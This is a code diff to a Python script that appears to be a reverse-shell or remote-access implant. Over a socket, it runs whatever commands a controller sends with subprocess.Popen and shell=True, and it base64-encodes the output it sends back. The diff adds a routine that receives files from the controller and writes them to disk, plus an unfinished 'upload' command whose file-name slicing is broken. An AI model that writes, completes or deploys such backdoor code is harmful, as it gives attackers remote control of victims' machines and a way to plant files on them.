@@ -1,4 +1,4 @@
-#/usr/bin/python3
+# /usr/bin/python3
 import ctypes
 import os
 import platform
@@ -20,8 +20,22 @@ def inbound():
             sock.close()
 
 
+def download_file(file_name):
+    file = open(file_name, 'wb')
+    sock.settimeout(1)
+    file_data = sock.recv(1024)
+    while file_data:
+        file.write(file_data)
+        try:
+            file_data = sock.recv(1024)
+        except socket.timeout:
+            break
+    sock.settimeout(None)
+    file.close()
+
+
 def outbound(message):
-    response = str(message).encode()
+    response = str(message)
     response = base64.b64encode(bytes(response, encoding="utf-8"))
     sock.send(response)
 
@@ -55,6 +69,15 @@ def session_handler():
                 pass
             elif message == 'help' or message == 'h':
                 pass
+            elif message == 'clear' or message == 'cls':
+                pass
+                continue
+
+            # Work in progress
+            elif message == 'upload' or message == 'up':
+                download_file(message[7:])
+                outbound('File Downloaded')
+                continue
             else:
                 command = subprocess.Popen(message,
                                            shell=True,
